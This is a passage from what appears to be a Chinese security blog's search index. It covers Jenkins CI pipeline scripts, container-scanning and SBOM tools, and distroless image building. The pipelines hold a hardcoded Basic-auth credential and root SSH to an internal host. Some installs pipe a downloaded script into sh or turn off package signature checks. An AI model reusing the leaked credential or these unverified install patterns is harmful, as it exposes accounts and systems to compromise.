&#x3D;&#x3D; &#39;pom.xml&#39; ]];then\n                        updatedb\n                        dockerfiles&#x3D;&#96;locate Dockerfile | grep -v target | grep $WORKSPACE&#39;&#x2F;&#39;&#96;\n                    else\n                        dir&#x3D;$&#123;POM_PATH%&#x2F;*&#125;\n                        echo $dir\n                        dockerfiles&#x3D;&#96;locate Dockerfile | grep -v target | grep $WORKSPACE&#39;&#x2F;&#39; | grep $dir&#96;\n                    fi\n                    \n                    for dockerfile in $dockerfiles\n                        do\n                            cat $dockerfile | while read line\n                                do\n                                    echo $line\n                                    str&#x3D;$&#123;line##*( )&#125;\n                                    echo $str\n                                    if [[ $str &#x3D;~ ^FROM ]];then\n                                        if [[ !( $str &#x3D;~ &#39;&#x2F;&#39; ) ]] || [[ !( $str &#x3D;~ &#39;registry.moses.com&#39; ) ]];then\n                                            echo &quot;Dockerfile 没有指定镜像源&quot;\n                                            exit 2\n                                        else\n                                            exit 0\n                                           \n                                        fi\n                                    fi\n                                done\n                        done\n                &#39;&#39;&#39;\n            &#125;\n        &#125;\n\n\n        stage(&#39;mavenSnapshotCheck&#39;)&#123;\n            steps &#123;\n                \n                sh &#39;&#39;&#39;\n                    echo &quot;获取白名单列表......&quot;\n                    white_services&#x3D;(&quot;hcfc-slam-entrust-web-v2&quot; &quot;hcfc-slam-entrust-soa&quot; &quot;credit-tencent&quot; &quot;lam-quota-soa&quot; &quot;credit-cloud&quot; &quot;credit-face&quot; &quot;hcfc-lam-web-v2&quot; &quot;hcfc-lam-cm-soa&quot; &quot;hcfc-lam-cm-web&quot; &quot;jdgp&quot; &quot;hcfc-lam-core-web&quot; &quot;hcfc-lam-core-soa&quot; &quot;hcfc-antifraud-auto&quot; &quot;hcfc-antifraud-soa&quot; &quot;hcfc-antifraud-web&quot; &quot;hcfc-auditor-auto&quot; &quot;hcfc-auditor-soa&quot; &quot;hcfc-auditor-web&quot; &quot;hcfc-roster-soa&quot; &quot;hcfc-jdgp-server&quot; &quot;id-generator&quot;)\n\n                    echo &quot;检查依赖项......&quot;\n                    \n                    dependency&#x3D;&#96;mvn dependency:list | grep -i snapshot| grep INFO|grep com.hcfc|awk &#39;&#123;print $2&#125;&#39;&#96;\n\n                    if ( [[ $&#123;#dependency&#125; -gt 0 ]] &amp;&amp; [[ ! (&quot;$&#123;white_services[@]&#125;&quot; &#x3D;~ &quot;$&#123;service_name&#125;&quot;) ]] );then\n\n                            echo &quot;依赖检查失败，请联系研发修改！！！&quot;\n                            exit 2\n                    else\n                        echo &quot;依赖检查通过！！！&quot;\n                    fi \n\n                    echo &quot;依赖检查结束......&quot;\n\n                    &#39;&#39;&#39;\n            &#125;\n\n        &#125;\n\n        &#x2F;&#x2F; stage(&#39;mavenSnapshotCheck&#39;) &#123;\n        &#x2F;&#x2F;     steps &#123;\n        &#x2F;&#x2F;         mavenSnapshotCheck check: true\n                \n        &#x2F;&#x2F;     &#125;\n        &#x2F;&#x2F; &#125;\n\n\n        stage(&#39;build&#39;) &#123;\n         steps &#123;\n                sh &#39;&#39;&#39;\n                    mvn clean install -e -U -DskipDockerPush -DdockerImageTags&#x3D;latest -Dmaven.test.skip&#x3D;true $mvn_params -f pom.xml\n                    if [[ $copy_to_remote_server &#x3D;&#x3D; &quot;true&quot; ]];then\n                        updatedb\n                        jar_path&#x3D;&#96;locate $service_name&quot;.jar&quot;| grep &quot;$WORKSPACE&quot;|grep docker|awk &#39;NR&#x3D;&#x3D;1&#123;print&#125;&#39;&#96;\n                        current&#x3D;$(date &quot;+%Y%m%d%H%M%S&quot;)\n                        ssh root@10.1.80.10 &quot;mkdir -p &#x2F;data&#x2F;guangfudai&#x2F;$service_name&#x2F;$current&quot;\n\t                    scp -r $jar_path &quot;root@10.1.80.10:&#x2F;data&#x2F;guangfudai&#x2F;$service_name&#x2F;$current&#x2F;&quot;\n                    fi\n                   # docker images\n                    \n                &#39;&#39;&#39;\n             &#125;\n         &#125;\n\n        stage(&#39;tag&#39;) &#123;\n            steps &#123;\n                sh &#39;&#39;&#39;\n                    \n\n                    if [[ &quot;$&#123;BRANCH&#125;&quot; &#x3D; &#39;master&#39; ]];then\n                    \n                        global_version&#x3D;&#96;cat pom.xml| grep revision|wc -l&#96;\n                    \n    \n                        if [[ $global_version -gt 0 ]];then\n                            POM_VERSION&#x3D;&#96;mvn -Dexec.executable&#x3D;&#39;echo&#39; -Dexec.args&#x3D;&#39;$&#123;project.version&#125;&#39; --non-recursive exec:exec -q -f pom.xml&#96;\n                        else\n                            POM_VERSION&#x3D;&#96;mvn -Dexec.executable&#x3D;&#39;echo&#39; -Dexec.args&#x3D;&#39;$&#123;project.version&#125;&#39; --non-recursive exec:exec -q -f $POM_PATH&#96;\n    \n                        fi\n                        \n                        VERSION&#x3D;&quot;$POM_VERSION&quot;\n                    else\n                        VERSION&#x3D;&quot;$&#123;BRANCH&#125;.$&#123;BUILD_ID&#125;&quot;\n                    fi\n                    echo &quot;Version:$VERSION&quot;\n                    echo &quot;#&#123;DOCKER_IMAGE&#125;&#x3D;$VERSION&quot; &gt; micro-service.version\n                    \n                    if [[ $POM_DOCKER_IMAGE &#x3D;~ &quot;:&quot; ]];then\n                        sub&#x3D;$&#123;POM_DOCKER_IMAGE##*:&#125;\n                        if [[ $sub &#x3D;~ &quot;&#x2F;&quot; ]];then\n                            echo $POM_DOCKER_IMAGE\n                        else\n                            VERSION&#x3D;$&#123;POM_DOCKER_IMAGE##*:&#125;\n                            POM_DOCKER_IMAGE&#x3D;$&#123;POM_DOCKER_IMAGE%%:*&#125;\n                        fi\n                    fi\n                    \n                    image&#x3D;&#96;&#x2F;usr&#x2F;bin&#x2F;docker images| grep &quot;latest&quot;|awk &#39;&#123;print $1&#125;&#39;|grep &quot;$POM_DOCKER_IMAGE$&quot;|wc -l&#96;\n                    \n\n                    if [[ $image -ne 0 ]];then\n                            &#x2F;usr&#x2F;bin&#x2F;docker tag  $POM_DOCKER_IMAGE:latest $ENV_DOCKER_REGISTRY_HOST&#x2F;$DOCKER_IMAGE:$VERSION\n\n                            if [[ &quot;$&#123;BRANCH&#125;&quot; &#x3D; &quot;master&quot; ]]; then\n                                &#x2F;usr&#x2F;bin&#x2F;docker tag $POM_DOCKER_IMAGE:latest  $ENV_DOCKER_REGISTRY_HOST&#x2F;$DOCKER_IMAGE:latest\n                                &#x2F;usr&#x2F;bin&#x2F;docker tag $POM_DOCKER_IMAGE:latest $ENV_DOCKER_REGISTRY_HOST&#x2F;$DOCKER_IMAGE:$&#123;BRANCH&#125;.$&#123;BUILD_ID&#125;\n                                &#x2F;usr&#x2F;bin&#x2F;docker push $ENV_DOCKER_REGISTRY_HOST&#x2F;$DOCKER_IMAGE:$&#123;BRANCH&#125;.$&#123;BUILD_ID&#125;\n                                &#x2F;usr&#x2F;bin&#x2F;docker push $ENV_DOCKER_REGISTRY_HOST&#x2F;$DOCKER_IMAGE:latest\n                            fi\n\n                            &#x2F;usr&#x2F;bin&#x2F;docker push $ENV_DOCKER_REGISTRY_HOST&#x2F;$DOCKER_IMAGE:$VERSION\n\n                            echo &quot;&#x2F;usr&#x2F;bin&#x2F;docker image: $ENV_DOCKER_REGISTRY_HOST&#x2F;$DOCKER_IMAGE:$VERSION&quot;\n                            echo &quot;&#x2F;usr&#x2F;bin&#x2F;docker image: $ENV_DOCKER_REGISTRY_HOST&#x2F;$DOCKER_IMAGE:latest&quot;\n                    else\n                            echo &quot;镜像打包失败，请检查 前面流程失败或者POM_DOCKER_IMAGE与研发代码中的不匹配&quot;\n\n                    fi\n                    echo &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;以下请忽略&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;\n                &#39;&#39;&#39;\n\n            &#125;\n        &#125;\n        \n        stage(&#39;clean no use images 忽略此步骤&#39;) &#123;\n         steps &#123;\n             \n             sh &#39;&#39;&#39;\n                if [[ $POM_DOCKER_IMAGE &#x3D;~ &quot;:&quot; ]];then\n                    POM_DOCKER_IMAGE&#x3D;$&#123;POM_DOCKER_IMAGE%%:*&#125;\n                fi\n                &#x2F;usr&#x2F;bin&#x2F;docker rmi $(&#x2F;usr&#x2F;bin&#x2F;docker images | grep -w $POM_DOCKER_IMAGE | awk -F &#39; &#39; &#39;&#123;print $1&quot;:&quot;$2&#125;&#39;)\n                &#x2F;usr&#x2F;bin&#x2F;docker rmi $(&#x2F;usr&#x2F;bin&#x2F;docker images | grep -w $DOCKER_IMAGE | awk -F &#39; &#39; &#39;&#123;print $1&quot;:&quot;$2&#125;&#39;)\n            &#39;&#39;&#39;\n                \n            &#125;\n         &#125;\n        \n    &#125;\n\n&#125;\n\npush images to registry Nexusimport hudson.model.*;\nimport hudson.*\n\npipeline &#123;\n    agent any\n\n    tools &#123;\n        &#x2F;&#x2F; maven &#39;maven&#39;\n        maven &#39;maven-apollo&#39;\n        git &#39;Default&#39;\n        jdk &#39;jdk&#39;\n\n    &#125;\n         \n    stages &#123;\n        stage(&#39;删除上次构建&#39; )&#123;\n            steps &#123;\n               \n                sh &#39;rm -rf *&#39;\n                sh &#39;rm -rf &#x2F;data&#x2F;maven&#x2F;localRepository3.8.1&#x2F;com&#x2F;hcfc&#x2F;*&#39;\n                sh &#39;docker images&#39;\n                \n                wrap([$class: &#39;BuildUser&#39;]) &#123;\n                  \n                  script&#123;\n                      buildName &quot;#$&#123;BUILD_ID&#125;-$&#123;dir_names&#125;-$&#123;env.BUILD_USER&#125;&quot;   \n                  &#125;\n                &#125;\n            &#125;\n        &#125;\n        \n        stage(&#39;拉取代码&#39;)&#123;\n            steps &#123;\n                echo &#39;代码分支:&#39;+BRANCH\n                echo &#39;代码地址:&#39; +GIT_URL\n                git branch: BRANCH, credentialsId: &#39;0eeb53a0-0390-41a4-9ac2-8d4c4c5c884f&#39;, url: GIT_URL\n                \n            &#125;\n        &#125;\n\n        stage(&#39;推送jar包&#39;)&#123;\n            steps &#123;\n                script&#123;\n                    \n                    sh &#39;&#39;&#39;\n                        dirs&#x3D;$&#123;dir_names&#x2F;&#x2F;,&#x2F; &#125;\n                        for dir in $&#123;dirs[@]&#125;\n                        do\n                            package_version&#x3D;&#96;mvn -Dexec.executable&#x3D;echo &#39;-Dexec.args&#x3D;$&#123;project.version&#125;&#39; --non-recursive exec:exec -q -f $dir&#x2F;pom.xml&#96;\n                            package_name&#x3D;&#96;mvn -Dexec.executable&#x3D;echo &#39;-Dexec.args&#x3D;$&#123;project.artifactId&#125;&#39; --non-recursive exec:exec -q -f $dir&#x2F;pom.xml&#96;\n                            url&#x3D;&#39;http:&#x2F;&#x2F;maven.moses.com&#x2F;service&#x2F;rest&#x2F;v1&#x2F;search?group&#x3D;com.hcfc&amp;name&#x3D;&#39;$package_name&#39;&amp;version&#x3D;&#39;$package_version\n                            \n                            curl -X GET $url -H &#39;Authorization: Basic dGVzdGplbmtpbnM6MzEybzZ6V0VOUGpvWmlWS3FHaWQ&#x3D;&#39; &gt; response_json\n                            items&#x3D;&#96;jq .items response_json&#96;\n                            \n                            if [[ $items !&#x3D; &#39;&#39; &amp;&amp; $items !&#x3D; [] ]];then\n                                echo &quot;版本已存在 &quot;\n                            fi\n                        done\n                    \n                        \n                        if [[ $dir_names &#x3D;&#x3D; &quot;&quot; ]];then\n                            mvn clean deploy $mvn_params -DskipDockerPush -DskipTests\n                        else\n                            mvn clean deploy -pl $dir_names $mvn_params -DskipDockerPush -DskipTests\n                        fi\n                        &#39;&#39;&#39;\n                &#125;\n                \n            &#125;\n        &#125;\n    &#125;\n\n&#125;\n前端项目打包import hudson.model.*;\n\npipeline &#123;\n    agent any\n\n    tools &#123;\n        git &#39;Default&#39;\n        nodejs &#39;node-13&#39;\n\n    &#125;\n         \n    stages &#123;\n        stage(&#39;删除上次构建&#39; )&#123;\n            steps &#123;\n                sh &#39;rm -rf *&#39;\n                \n                wrap([$class: &#39;BuildUser&#39;]) &#123;\n                  \n                   script&#123;\n                       buildName &quot;#$&#123;service_name&#125;-$&#123;BRANCH&#125;-$&#123;env.BUILD_USER&#125;&quot;   \n\n                   &#125;\n                &#125;\n            &#125;\n        &#125;\n        \n        stage(&#39;拉取代码&#39;)&#123;\n            steps &#123;\n                echo &#39;代码分支:&#39;+BRANCH\n                echo &#39;代码地址:&#39; +GIT_URL\n                git branch: BRANCH, credentialsId: &#39;0eeb53a0-0390-41a4-9ac2-8d4c4c5c884f&#39;, url: GIT_URL\n            &#125;\n        &#125;\n        \n        stage(&#39;安装npm&#39;)&#123;\n            steps &#123;\n                script &#123;\n                    sh  &#39;&#39;&#39;\n                        cnpm install\n                        git submodule init \n                        git submodule update\n                    &#39;&#39;&#39;\n                &#125;\n            &#125;\n        &#125;\n\n        stage(&#39;build&#39;) &#123;\n            steps &#123;\n                sh &#39;&#39;&#39;\n                    export CI&#x3D;false\n                    npm run build$&#123;ENVIRONMENT&#125;\n                &#39;&#39;&#39;\n            &#125;\n        &#125;\n         \n        stage(&#39;deploy&#39;) &#123;\n            steps &#123;\n                sh &#39;&#39;&#39;\n                    cd $BUILD_DIR\n                    ssh $SSH_AGENT_ACCOUNT@$SSH_AGENT_IP &quot;cd $SSH_AGENT_PATH&#x2F;$DOMAIN&#x2F;$DIR &amp;&amp; rm -rf *&quot;\n                    scp -r * $SSH_AGENT_ACCOUNT@$SSH_AGENT_IP:$SSH_AGENT_PATH&#x2F;$DOMAIN&#x2F;$DIR\n                    ssh $SSH_AGENT_ACCOUNT@$SSH_AGENT_IP &quot;cd $SSH_AGENT_PATH&#x2F;$DOMAIN&#x2F;$DIR &amp;&amp; zip -r $&#123;service_name&#125;.moses.com.zip .&#x2F;*&quot;\n                &#39;&#39;&#39;\n            &#125;\n        &#125;               \n\n    &#125;\n\n&#125;","slug":"Jenkins pipeline","date":"2022-09-14T02:13:00.000Z","categories_index":"软件供应链安全","tags_index":"CI/CD,SCA,Jenkins","author_index":"Moses"},{"id":"3675872e04aa6948518b5c79b3c5c1a2","title":"容器镜像安全工具-Veinmind-tools","content":"\n\n\n\n\n\n\n\n\n工具的道与术：道，是指这个工具内在的哲学，如果你觉得哲学这个词太大了，也可以叫它逻辑。一个工具的优雅之处就体现在「道」上，「道」虽然貌似虚无缥缈，它却是最容易区分同类型工具之间不同之处的东西。术，就是技术层面，这个工具怎么操作，怎么用起来。\nveinmind-tools0x01简介veinmind-tools是由长亭科技自研，基于 veinmind-sdk 打造的容器安全工具集\n0x02架构图略\n0x03核心能力\n\n\n工具\n功能\n\n\n\nveinmind-runner\n扫描工具运行宿主\n\n\nveinmind-malicious\n扫描镜像中的恶意文件\n\n\nveinmind-weakpass\n扫描镜像中的弱口令\n\n\nveinmind-sensitive\n扫描镜像中的敏感信息\n\n\nveinmind-backdoor\n扫描镜像中的后门\n\n\nveinmind-history\n扫描镜像中的异常历史命令\n\n\nveinmind-asset\n扫描镜像中的资产信息\n\n\nveinmind-webshell\n扫描镜像中的 Webshell\n\n\n0x04云原生兼容性\n\n\n名称\n类别\n是否兼容\n\n\n\nJenkins\nCI&#x2F;CD\n✔️\n\n\nGitlab CI\nCI&#x2F;CD\n✔️\n\n\nGithub Action\nCI&#x2F;CD\n✔️\n\n\nDockerHub\n镜像仓库\n✔️\n\n\nDocker Registry\n镜像仓库\n✔️\n\n\nHarbor\n镜像仓库\n✔️\n\n\nDocker\n容器运行时\n✔️\n\n\nContainerd\n容器运行时\n✔️\n\n\n0x05Quickstartrequire安装docker\ninstall安装镜像\ndocker pull veinmind&#x2F;veinmind-runner:latest\n下载 veinmind-runner 平行容器启动脚本\nwget -q https:&#x2F;&#x2F;download.veinmind.tech&#x2F;scripts&#x2F;veinmind-runner-parallel-container-run.sh -O run.sh &amp;&amp; chmod +x run.sh\n快速扫描本地镜像\n.&#x2F;run.sh scan-host\n0x06libVeinMindlibveinmind一个由长亭自研，直观而可扩展的容器安全 SDK\nquick start一般情况下，应用应以平行容器的方式发布和部署，用户无需额外安装依赖。如何以平行容器方式构建与发布应用，详见平行容器说明文档。\n若应用只支持本地运行，或需要搭建本地环境进行开发，则需要先安装对应平台下的问脉 SDK 软件包。\n软件安装包元信息中包含问脉 SDK 的相关许可协议，在开发和使用时请遵守许可协议。当您下载并安装 SDK 软件包后即视为您已同意问脉 SDK 使用协议。\n在 Ubuntu 和 Debian 平台下，添加问脉 SDK 的 APT 仓库即可安装所需软件包：\necho &#39;deb [trusted&#x3D;yes] https:&#x2F;&#x2F;download.veinmind.tech&#x2F;libveinmind&#x2F;apt&#x2F; .&#x2F;&#39; | sudo tee &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;libveinmind.list\nsudo apt-get update\nsudo apt-get install libveinmind-dev\n在 RedHat 和 CentOS 平台下，添加问脉 SDK 的 yum 仓库即可安装所需软件包：\nsudo cat &gt; &#x2F;etc&#x2F;yum.repos.d&#x2F;libveinmind.repo &lt;&lt; &#x3D;&#x3D;EOF&#x3D;&#x3D;\n[libveinmind]\nname&#x3D;libVeinMind SDK yum repository\nbaseurl&#x3D;https:&#x2F;&#x2F;download.veinmind.tech&#x2F;libveinmind&#x2F;yum&#x2F;\nenabled&#x3D;1\ngpgcheck&#x3D;0\n&#x3D;&#x3D;EOF&#x3D;&#x3D;\nsudo yum install libveinmind-devel\n开发指南\nAPI 文档及使用样例（Golang、Python3）\n插件系统（如何开发可复用的容器安全工具）\n平行容器（如何容器化部署容器安全工具）\n\n0x07Veinmind Jenkinsveinmind-jenkins可以快速集成 veinmind-runner 扫描能力到您的CI中\nquick start\n支持自动扫描模式，无需修改Jenkinsfile文件或BuildStep，自动识别docker build的动作，触发扫描任务。\n支持手动模式，可以手动增加Build Step&#x2F;Pipeline Step来手动触发扫描。\n简便安装，一次安装，永久使用。\n使用简单，无需记住复杂的参数，鼠标配置即可。\n支持阻断功能。\n提供数据统计和详情页面。\n\n适配性Veinmind Scanner 需要如下的条件。\n\nJenkins 支持版本 &gt; v2.332.4\n\n对于自动扫描功能，目前支持的自动扫描的方法:\n\n\n\n\n\n插件名称\nJob类型\n是否支持Auto\n\n\n\nLinux Shell\nFreeStyle\n✅\n\n\nDocker plugin\nFreeStyle\n✅\n\n\nDocker build step\nFreeStyle\n✅\n\n\nPipeline Shell(sh)\nPipeline\n✅\n\n\nDocker Pipeline\nPipeline\n✅\n\n\nUsage略，详见GitHub\nReferencesVeinmind 在 Jenkins 的0部署成本自动化扫描方案\n","slug":"veinmind-tools","date":"2022-09-13T08:44:00.000Z","categories_index":"Cloud-Native-Security","tags_index":"CI/CD,容器安全,镜像安全,长亭科技","author_index":"Moses"},{"id":"d761d3905282bd119994c0c8a6e0235c","title":"容器镜像构建与分发的技术实践与安全思索","content":"容器镜像构建与分发的技术实践与安全思索BackendDocker 能引爆容器，主要原因是它带来了镜像和镜像分发技术。 容器运行时是 Kubernetes 平台的基础组件，镜像则是容器的静态文件，容器由镜像创建。在 Kubernetes 平台中，我们交付的所有应用，最终都是以镜像形式交付的，镜像的构建与分发，直接影响 CI&#x2F;CD 的完成度。所以，镜像也是 Kubernetes 平台的重要基础。\n镜像的来源镜像的来源一般有两种形式。一种是通过构建生成镜像，在基础镜像上添加用户自定义的内容及配置，制作出业务镜像，如基于 JDK 基础镜像构建 Java 程序的应用镜像。另一种是从镜像仓库获取别人制作好的镜像，很多常用软件或系统都会有官方制作好的镜像，存储在公开的镜像仓库中，如 rocky、nginx、redis 等，你可以在 Docker Hub 搜索并下载它们。\n关于免发行版容器的概念大体概念是将应用程序打包到容器镜像中，同时尽可能多地删除操作系统（软件包管理器、库、shell等）如谷歌的[[容器镜像构建与分发的技术实践与安全思索#基础镜像-Distroless]].但是，就Linux发行版来说是由两个主要组件组成的：内核和用户空间。内核相对容器理解，它是是个硬件或虚拟机运行的特殊程序。用户空间有点难以理解。用户空间包括在容器镜像中看到的所有内容，如C库（glibc)、Web服务器、加密库、时区数据、区域设置数据（语言）等。用户空间无法真正从发行版容器镜像中删除，无发行版镜像必须始终在内核上运行。即使谷歌的[[容器镜像构建与分发的技术实践与安全思索#基础镜像-Distroless]]项目也依赖Debian来满足用户空间要求。 when can we expect distroless based on bullseye? · Issue #780 · GoogleContainerTools&#x2F;distroless · GitHub即使在无发行版的容器镜像中，想Java虚拟机、Python和node.js等内容也是根据C库编译的，该库是这些用户空间程序可以访问Linux内核中的低级功能（网络套接字、存储、文件等）\nChallenge企业中哪个部门负责构建镜像docker的安全问题\n Docker daemon (Docker in Docker)\n Docker Unix socket从主机挂载到构建容器中\n\n性能问题\n多大程度的利用缓存\nOCI标准和K8S生态\n\nTheory反模式之黄金基础镜像\n\n\n\n\n\n\n\n\n•黄金基础镜像 (golden base image)：我们预先配置好的镜像，作为构建应用程序镜像的基础镜像。•反模式 (antipattern) ：在实践中经常出现但低效或是有待优化的设计模式。\n黄金镜像的概念作为最常见的基础容器安全控制的思路，通过预先配置好的基础镜像构建企业应用程序的镜像，镜像的工具和库都经过了严格的审核。需要检查、维护相关软件的安全状态，并且要审核使用非黄金镜像构建的应用镜像，可能要引入可信镜像的概念和方法论考虑到当从第三方或官方获取需要的上游镜像构建应用程序和配置时会引入新的相关问题，首先，从上游镜像到内部定制版镜像的初始转换涉及额外工作。其次，运维团队有责任存储和维护这些内部镜像。在典型环境中，使用的镜像数量会越来越多，涉及的额外工作也随之增加，最终导致更严峻的安全状况，如镜像的更新操作，即使有，频率也会很低。\n黄金镜像的一些要求：\n\n确保安装了特定的软件\n确保不存在易受攻击的库\n确保用户具有正确的权限\n\n评估黄金镜像的原则：\n\n确保镜像由信誉良好的组织发布。不能随便从 DockerHub 或其他公开的镜像注册表的某个仓库下载镜像，因为这些镜像将是构建应用程序镜像的基础。\n优先选择持续更新的镜像。基础镜像通常包含工具和库，发现漏洞时，必须打补丁。\n首选开源了构建过程或规范的镜像。通常是 Dockerfile 文件，你可以通过它了解镜像是如何构建的。\n避免使用包含不必要工具或库的镜像。首选最小化镜像，这些镜像占用的空间很小，必要时开发人员可以在其上进行二次构建。\n\n基础镜像-Distroless谷歌现在通过提供 Distroless 镜像向全世界开放这种能力。谷歌构建的这些镜像的目标是只包含你的应用程序及其依赖项，同时它们将没有常规 Linux 发行版的所有特性，包括 shell。\n这意味着虽然可以想以前一样运行应用程序的容器，但不能在容器运行的时候进入容器内。这是一个重大的安全改进，因为你现在已经为黑客通过 shell 进入你的容器关上了大门。\n以下基础镜像是正式发布的版本：目前最新版本支持debian11\n\ngcr.io&#x2F;distroless&#x2F;static-debian10\ngcr.io&#x2F;distroless&#x2F;base-debian10\ngcr.io&#x2F;distroless&#x2F;java-debian10\ngcr.io&#x2F;distroless&#x2F;cc-debian10\ngcr.io&#x2F;distroless&#x2F;nodejs-debian10\n\n下面的基础镜像仍在实验阶段，不推荐用于生产环境：\n\ngcr.io&#x2F;distroless&#x2F;python2.7-debian10\ngcr.io&#x2F;distroless&#x2F;python3-debian10\ngcr.io&#x2F;distroless&#x2F;java&#x2F;jetty-debian10\ngcr.io&#x2F;distroless&#x2F;dotnet\n\nexample# Start by building the application.\nFROM golang:1.18 as build\n\nWORKDIR &#x2F;go&#x2F;src&#x2F;app\nCOPY . .\n\nRUN go mod download\nRUN CGO_ENABLED&#x3D;0 go build -o &#x2F;go&#x2F;bin&#x2F;app\n\n# Now copy it into our base image.\nFROM gcr.io&#x2F;distroless&#x2F;static-debian11\nCOPY --from&#x3D;build &#x2F;go&#x2F;bin&#x2F;app &#x2F;\nCMD [&quot;&#x2F;app&quot;]\n\n\n关于网络参考下载离线镜像，使用云服务器或者有🪜条件的服务器获取镜像。\n关于调试# Start by building the application.\nFROM golang:1.18 as build\n\nWORKDIR &#x2F;go&#x2F;src&#x2F;app\nCOPY . .\n\nRUN go mod download\nRUN CGO_ENABLED&#x3D;0 go build -o &#x2F;go&#x2F;bin&#x2F;app\n\n# 在镜像后添加 debug 标签开启调试模式\nFROM gcr.io&#x2F;distroless&#x2F;base:debug\nCOPY --from&#x3D;build &#x2F;go&#x2F;bin&#x2F;app &#x2F;\nCMD [&quot;&#x2F;app&quot;]\n\nTools-构建容器的工具BuildKitBuildKit 是下一代的镜像构建组件，在 https://github.com/moby/buildkit 开源。\n注意：如果您的镜像构建使用的是云服务商提供的镜像构建服务（腾讯云容器服务、阿里云容器服务等），由于上述服务提供商的 Docker 版本低于 18.09，BuildKit 无法使用，将造成镜像构建失败。build建议使用 BuildKit 构建镜像时使用一个新的 Dockerfile 文件（例如 Dockerfile.buildkit）\n目前，Docker Hub 自动构建已经支持 buildkit，具体请参考 https://github.com/docker-practice/docker-hub-buildx\nCloud Native Buildpacks（CNB）kanikokaniko 是一个在容器或 Kubernetes 集群内从 Dockerfile 构建容器镜像的工具 ( Build Container Images In Kubernetes )。\n\n\n\n\n\n\n\n\n\n由于 kaniko 不依赖于 Docker 守护进程，并且完全在用户空间中执行 Dockerfile 中的每个命令，这使得能够在轻松或安全地运行在无Docker守护程序的环境（如标准Kubernetes集群 V1.24.x）中构建容器映像。在 Kubernetes V1.24.x 版本之后默认采用 containerd.io 作为缺省的cri，不在支持 docker-shim 意味着我们不需要安装 docker 环境\nBazel待补充\nimg待补充\njib如果你是在 Java 环境下面，还可以使用 Jib 来构建镜像，Jib 也是 Google 开源的，只是是针对 Java 容器镜像构建的工具。通过使用 Jib，Java 开发人员可以使用他们熟悉的 Java 工具来构建镜像。Jib 是一个快速而简单的容器镜像构建工具，它负责处理将应用程序打包到容器镜像中所需的所有步骤，它不需要你编写 Dockerfile 或安装 Docker，而且可以直接集成到 Maven 和 Gradle 中，只需要将插件添加到构建中，就可以立即将 Java 应用程序容器化。\nJib 利用了 Docker 镜像的分层机制，将其与构建系统集成，并通过以下方式优化 Java 容器镜像的构建：\n\n简单：Jib 使用 Java 开发，并作为 Maven 或 Gradle 的一部分运行。你不需要编写 Dockerfile 或运行 Docker 守护进程，甚至无需创建包含所有依赖的大 JAR 包。因为 Jib 与 Java 构建过程紧密集成，所以它可以访问到打包应用程序所需的所有信息。\n\n快速：Jib 利用镜像分层和缓存来实现快速、增量的构建。它读取你的构建配置，将你的应用程序组织到不同的层（依赖项、资源、类）中，并只重新构建和推送发生变更的层。在项目进行快速迭代时，Jib 只将发生变更的层（而不是整个应用程序）推送到镜像仓库来节省宝贵的构建时间。\n\n可重现：Jib 支持根据 Maven 和 Gradle 的构建元数据进行声明式的容器镜像构建，因此，只要输入保持不变，就可以通过配置重复创建相同的镜像。\n\n\nReferences容器镜像构建与分发如何使用 Distroless 让你的容器更加安全 - 腾讯云开发者社区-腾讯云使用以语言为中心的容器基础镜像 distroless - 知乎简单的 Kubernetes 集群搭建 - 苏洋博客Distroless Docker images | Technology Radar | Thoughtworks如何使用 Distroless 让你的容器更加安全 - SegmentFault 思否丢弃手中的docker build ，使用Kaniko直接在K8S集群或Containerd环境构建推送容器镜像常用容器镜像构建工具和方案介绍Harden Your Containers with Distroless Docker Images | Better ProgrammingWhy distroless containers aren’t the security solution you think they areDo Linux distributions still matter with containers?Distroless Docker images | Technology Radar | Thoughtworks可以像 Docker 一样方便的使用 Containerd 吗？\n","slug":"容器镜像构建与分发的技术实践与安全思索","date":"2022-09-01T06:34:00.000Z","categories_index":"Cloud-Native-Security","tags_index":"容器镜像安全,Distroless,buidlkit,CNB","author_index":"Moses"},{"id":"5d3847e382c5758f0e662a8985f6d419","title":"软件成分分析工具-syft","content":"syft0x01简介syftGitHub about：CLI tool and library for generating a Software Bill of Materials from container images and filesystems其他信息\n\n项目由anchore开源\ngrype![[SBOM工具介绍#Anchore]]\n\n0x02架构图\n0x03核心能力Features\nGenerates SBOMs for container images, filesystems, archives, and more to discover packages and libraries\nSupports OCI and Docker image formats\nLinux distribution identification\nWorks seamlessly with Grype (a fast, modern vulnerability scanner)\nAble to create signed SBOM attestations using the in-toto specification\nConvert between SBOM formats, such as CycloneDX, SPDX, and Syft’s own format.\n\n0x04支持生态\nAlpine (apk)\nC (conan)\nC++ (conan)\nDart (pubs)\nDebian (dpkg)\nDotnet (deps.json)\nObjective-C (cocoapods)\nGo (go.mod, Go binaries)\nHaskell (cabal, stack)\nJava (jar, ear, war, par, sar)\nJavaScript (npm, yarn)\nJenkins Plugins (jpi, hpi)\nPHP (composer)\nPython (wheel, egg, poetry, requirements.txt)\nRed Hat (rpm)\nRuby (gem)\nRust (cargo.lock)\nSwift (cocoapods)\n\n0x05Quickstartrequireinstall# linux\ncurl -sSfL https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;anchore&#x2F;syft&#x2F;main&#x2F;install.sh | sh -s -- -b &#x2F;usr&#x2F;local&#x2F;bin\n# macos\nbrew tap anchore&#x2F;syft\nbrew install syft\n\n\n\n进阶-jenkins集成install dockersudo apt-get install docker.io -y\nsudo systemctl enable docker\nsudo systemctl start docker\nsudo usermod -aG docker 